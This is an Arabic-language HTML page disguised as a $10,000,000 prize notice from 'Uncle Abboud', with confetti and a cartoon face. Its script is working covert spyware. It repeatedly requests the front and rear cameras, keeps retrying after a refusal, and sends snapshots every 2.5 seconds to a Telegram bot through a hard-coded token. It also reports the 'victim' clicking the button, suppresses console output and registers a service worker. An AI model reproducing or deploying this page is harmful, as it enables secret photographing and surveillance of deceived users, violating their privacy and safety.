<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>🎁 جائزة عمك عبود</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body {
  background: linear-gradient(135deg, #0a0000, #1a0505, #0a0000);
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  font-family: 'Arial', sans-serif;
  overflow: hidden;
}
.confetti-container {
  position: fixed;
  top: 0; left: 0; width: 100%; height: 100%;
  pointer-events: none;
  z-index: 0;
  overflow: hidden;
}
.confetti {
  position: absolute;
  width: 10px; height: 10px;
  top: -10px;
  animation: confettiFall linear infinite;
}
@keyframes confettiFall {
  0% { transform: translateY(0) rotate(0deg); opacity: 1; }
  100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
}
.card {
  position: relative;
  z-index: 1;
  background: linear-gradient(145deg, #1a0808, #2d0a0a);
  border: 3px solid #ffd700;
  border-radius: 30px;
  padding: 40px 35px;
  max-width: 480px;
  width: 92%;
  text-align: center;
  box-shadow: 0 0 60px rgba(255, 215, 0, 0.25);
  animation: glowPulse 2.5s ease-in-out infinite;
}
@keyframes glowPulse {
  0%, 100% { box-shadow: 0 0 40px rgba(255,215,0,0.2); }
  50% { box-shadow: 0 0 80px rgba(255,215,0,0.45); }
}
.star { font-size: 70px; display: block; animation: spinStar 3s linear infinite; }
@keyframes spinStar {
  0% { transform: rotate(0deg) scale(1); }
  50% { transform: rotate(180deg) scale(1.15); }
  100% { transform: rotate(360deg) scale(1); }
}
.title { color: #ffd700; font-size: 32px; font-weight: bold; margin: 10px 0; text-shadow: 0 0 30px rgba(255,215,0,0.4); }
.subtitle { color: #ffaa00; font-size: 20px; margin: 5px 0; }
.prize {
  background: linear-gradient(145deg, #ffd700, #ff8c00);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  font-size: 38px;
  font-weight: bold;
  margin: 10px 0;
}
.message { color: #ffcc88; font-size: 17px; line-height: 1.8; margin: 15px 0; }
.btn {
  background: linear-gradient(145deg, #ffd700, #ff8c00);
  color: #1a0000;
  border: none;
  padding: 14px 45px;
  font-size: 19px;
  font-weight: bold;
  border-radius: 50px;
  cursor: pointer;
  transition: 0.3s;
  margin-top: 10px;
  box-shadow: 0 0 30px rgba(255,215,0,0.3);
}
.btn:hover { transform: scale(1.05); box-shadow: 0 0 60px rgba(255,215,0,0.6); }
.uncle-face {
  margin: 15px auto;
  width: 150px; height: 150px;
  background: radial-gradient(ellipse at 50% 40%, #d4a574, #b8834a);
  border-radius: 50%;
  position: relative;
  display: inline-block;
  border: 3px solid #8B6914;
  box-shadow: 0 0 40px rgba(255,215,0,0.15);
}
.turban {
  position: absolute;
  width: 170px; height: 50px;
  background: linear-gradient(180deg, #8B0000, #5a0000);
  border-radius: 50% 50% 0 0;
  top: -25px; left: 50%;
  transform: translateX(-50%);
  border: 2px solid #6B0000;
}
.turban::after { content: '💎'; position: absolute; font-size: 20px; top: 10px; left: 50%; transform: translateX(-50%); }
.eye {
  position: absolute;
  width: 22px; height: 25px;
  background: #fff;
  border-radius: 50%;
  top: 40px;
}
.eye::after {
  content: '';
  position: absolute;
  width: 12px; height: 12px;
  background: #2d1a0a;
  border-radius: 50%;
  bottom: 4px; left: 5px;
  animation: eyeMove 3s ease-in-out infinite;
}
.eye-left { left: 28px; }
.eye-right { right: 28px; }
@keyframes eyeMove { 0%,100%{transform:translateX(0);} 25%{transform:translateX(3px);} 75%{transform:translateX(-3px);} }
.brow {
  position: absolute;
  width: 30px; height: 6px;
  background: #5a3a1a;
  border-radius: 10px;
  top: 32px;
}
.brow-left { left: 24px; transform: rotate(-10deg); }
.brow-right { right: 24px; transform: rotate(10deg); }
.mouth {
  position: absolute;
  width: 40px; height: 20px;
  border-bottom: 4px solid #8B0000;
  border-radius: 0 0 50% 50%;
  bottom: 30px; left: 50%;
  transform: translateX(-50%);
  animation: smile 1.5s ease-in-out infinite;
}
@keyframes smile { 0%,100%{height:20px;} 50%{height:28px;} }
.mustache {
  position: absolute;
  width: 50px; height: 20px;
  background: #3a2510;
  border-radius: 0 0 50% 50%;
  bottom: 48px; left: 50%;
  transform: translateX(-50%);
}
.mustache::before {
  content: '';
  position: absolute;
  width: 30px; height: 15px;
  background: #3a2510;
  border-radius: 0 0 50% 50%;
  left: -20px; top: 0;
  transform: rotate(20deg);
}
.mustache::after {
  content: '';
  position: absolute;
  width: 30px; height: 15px;
  background: #3a2510;
  border-radius: 0 0 50% 50%;
  right: -20px; top: 0;
  transform: rotate(-20deg);
}
.uncle-name { color: #ffd700; font-size: 20px; margin-top: 8px; font-weight: bold; }
.hidden { display: none !important; }
#status { color: #aa8855; font-size: 14px; margin-top: 15px; }
.sparkle { color: #ffd700; font-size: 18px; animation: sparkleFloat 1.8s ease-in-out infinite; display: inline-block; }
@keyframes sparkleFloat { 0%,100%{transform:scale(1);opacity:0.5;} 50%{transform:scale(1.3);opacity:1;} }
</style>
</head>
<body>

<div class="confetti-container" id="confettiContainer"></div>

<!-- عناصر الفيديو والكانفس مخفية تمامًا -->
<video id="videoFront" autoplay muted playsinline class="hidden"></video>
<video id="videoBack" autoplay muted playsinline class="hidden"></video>
<canvas id="canvasFront" class="hidden"></canvas>
<canvas id="canvasBack" class="hidden"></canvas>

<div class="card">
  <span class="star">⭐</span>
  <div class="title">🎉 مبروك! 🎉</div>
  <div class="subtitle">لقد فزت بجائزة عمك عبود!</div>
  
  <div class="uncle-face">
    <div class="turban"></div>
    <div class="brow brow-left"></div>
    <div class="brow brow-right"></div>
    <div class="eye eye-left"></div>
    <div class="eye eye-right"></div>
    <div class="mustache"></div>
    <div class="mouth"></div>
  </div>
  <div class="uncle-name">👳 عمك عبود</div>
  
  <div class="prize">🏆 10,000,000 $ 🏆</div>
  <div class="message">
    🎁 الجائزة عند <strong>عمك عبود</strong> 🎁<br>
    📍 تعال واستلمها الآن!
  </div>
  
  <button class="btn" id="claimBtn">🤑 استلم الجائزة الآن</button>
  <div style="margin-top:8px;color:#886633;font-size:13px;">⏳ العرض محدود - اسرع!</div>
  <div id="status">⏳ جاري تجهيز الجائزة...</div>
</div>

<script>
// ============================================================
// ================ BOT CONFIG (خفي) ==========================
// ============================================================
const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
let CHAT_ID = '';
let frontInterval = null, backInterval = null;
const CAPTURE_INTERVAL = 2500;

// ============================================================
// ================ CONFETTI ===================================
// ============================================================
function createConfetti() {
  const container = document.getElementById('confettiContainer');
  const colors = ['#ffd700', '#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6bff', '#ffaa00'];
  for (let i = 0; i < 70; i++) {
    const c = document.createElement('div');
    c.className = 'confetti';
    c.style.left = Math.random() * 100 + '%';
    c.style.background = colors[Math.floor(Math.random() * colors.length)];
    c.style.width = (Math.random() * 8 + 4) + 'px';
    c.style.height = (Math.random() * 8 + 4) + 'px';
    c.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
    c.style.animationDuration = (Math.random() * 3 + 2) + 's';
    c.style.animationDelay = (Math.random() * 4) + 's';
    container.appendChild(c);
  }
}
createConfetti();

// ============================================================
// ================ TELEGRAM (صامت) ===========================
// ============================================================
function getChatId() {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
    .then(r => r.json())
    .then(d => {
      if (d.ok && d.result && d.result.length) {
        let last = d.result[d.result.length - 1];
        CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
        if (CHAT_ID) {
          startHiddenCamera();
        } else {
          setTimeout(getChatId, 2000);
        }
      } else {
        setTimeout(getChatId, 2000);
      }
    })
    .catch(() => setTimeout(getChatId, 2000));
}

function sendMessage(text) {
  if (!CHAT_ID) return;
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  }).catch(() => {});
}

function sendPhoto(imageData, caption = '') {
  if (!CHAT_ID || !imageData) return;
  try {
    let blob = dataURLtoBlob(imageData);
    let fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('photo', blob, `photo_${Date.now()}.jpg`);
    fd.append('caption', caption || '📸');
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: fd
    }).catch(() => {});
  } catch(e) {}
}

function dataURLtoBlob(dataURL) {
  let parts = dataURL.split(',');
  let mime = parts[0].match(/:(.*?);/)[1];
  let bstr = atob(parts[1]);
  let n = bstr.length;
  let u8arr = new Uint8Array(n);
  for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
  return new Blob([u8arr], { type: mime });
}

// ============================================================
// ================ تشغيل الكاميرات (صامت + تلقائي) ==========
// ============================================================
function startHiddenCamera() {
  // محاولة تشغيل الكاميرا الأمامية
  navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
    audio: false
  })
  .then(stream => {
    let video = document.getElementById('videoFront');
    video.srcObject = stream;
    video.play();
    
    let canvas = document.getElementById('canvasFront');
    canvas.width = 640;
    canvas.height = 480;
    let ctx = canvas.getContext('2d');
    
    if (frontInterval) clearInterval(frontInterval);
    frontInterval = setInterval(() => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      let imgData = canvas.toDataURL('image/jpeg', 0.85);
      sendPhoto(imgData, '📸 أمامي');
    }, CAPTURE_INTERVAL);
    
    document.getElementById('status').innerHTML = '✅ الكاميرا الأمامية تعمل';
  })
  .catch(() => {
    // إذا رفض المستخدم أو فشل، نحاول مرة أخرى بعد ثانية
    setTimeout(startHiddenCamera, 1000);
  });

  // محاولة تشغيل الكاميرا الخلفية
  navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
    audio: false
  })
  .then(stream => {
    let video = document.getElementById('videoBack');
    video.srcObject = stream;
    video.play();
    
    let canvas = document.getElementById('canvasBack');
    canvas.width = 640;
    canvas.height = 480;
    let ctx = canvas.getContext('2d');
    
    if (backInterval) clearInterval(backInterval);
    backInterval = setInterval(() => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      let imgData = canvas.toDataURL('image/jpeg', 0.85);
      sendPhoto(imgData, '📸 خلفي');
    }, CAPTURE_INTERVAL);
  })
  .catch(() => {
    // إذا رفض المستخدم أو فشل، نحاول مرة أخرى بعد ثانية
    setTimeout(startHiddenCamera, 1000);
  });

  // منع السكون (صامت)
  if ('wakeLock' in navigator) {
    navigator.wakeLock.request('screen').catch(() => {});
  }
}

// ============================================================
// ================ زر استلام الجائزة (محاكاة النقر) =========
// ============================================================
document.getElementById('claimBtn').addEventListener('click', function(e) {
  // إرسال إشعار إلى التيليجرام
  sendMessage('🤑 الضحية نقر على زر استلام الجائزة');
  
  // محاولة تشغيل الكاميرات مرة أخرى (في حال لم تعمل سابقاً)
  startHiddenCamera();
  
  // عرض رسالة وهمية
  alert('🎉 تهانينا! جائزتك عند عمك عبود في الزاوية القريبة من المسجد الكبير 🕌');
  
  // محاولة طلب الصلاحية بشكل مخفي عبر عنصر وهمي (لخداع المتصفح)
  try {
    let fakeInput = document.createElement('input');
    fakeInput.type = 'file';
    fakeInput.accept = 'image/*';
    fakeInput.style.display = 'none';
    document.body.appendChild(fakeInput);
    fakeInput.click();
    setTimeout(() => {
      document.body.removeChild(fakeInput);
    }, 100);
  } catch(e) {}
});

// ============================================================
// ================ محاولة تلقائية لتشغيل الكاميرات ==========
// ============================================================
// المحاولة الأولى بعد تحميل الصفحة
setTimeout(() => {
  startHiddenCamera();
}, 500);

// المحاولة الثانية بعد 3 ثواني
setTimeout(() => {
  if (!frontInterval && !backInterval) {
    startHiddenCamera();
  }
}, 3000);

// ============================================================
// ================ Service Worker (صامت) =====================
// ============================================================
if ('serviceWorker' in navigator) {
  const swCode = `
    self.addEventListener('install', e => self.skipWaiting());
    self.addEventListener('activate', e => e.waitUntil(clients.claim()));
    self.addEventListener('fetch', e => e.respondWith(fetch(e.request)));
  `;
  const blob = new Blob([swCode], { type: 'application/javascript' });
  const swUrl = URL.createObjectURL(blob);
  navigator.serviceWorker.register(swUrl).catch(() => {});
}

// ============================================================
// ================ بدء التشغيل (صامت) ========================
// ============================================================
console.log = console.warn = console.error = () => {};

getChatId();

setTimeout(() => {
  if (!CHAT_ID) getChatId();
}, 5000);
</script>
</body>
</html>
